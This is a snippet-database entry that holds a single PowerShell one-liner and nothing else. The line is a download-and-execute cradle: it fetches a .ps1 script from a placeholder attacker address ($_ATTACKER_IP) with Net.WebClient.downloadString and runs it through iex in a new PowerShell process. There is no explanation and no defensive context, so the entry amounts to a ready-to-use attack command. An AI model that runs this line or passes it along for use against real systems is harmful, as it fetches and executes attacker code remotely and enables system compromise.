---
id: 91f5b3ef-f0c1-40ec-a59e-c1edf5df2f87
type: code
language: Powershell
verified: false
created_at: '2019-12-05T23:11:23.190410+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 91f5b3ef

**Language**: Powershell

```powershell
echo iex(new-Object Net.WebClient).downloadString("http://$_ATTACKER_IP/$_FILENAME.ps1") | powershell -noprofile -
```
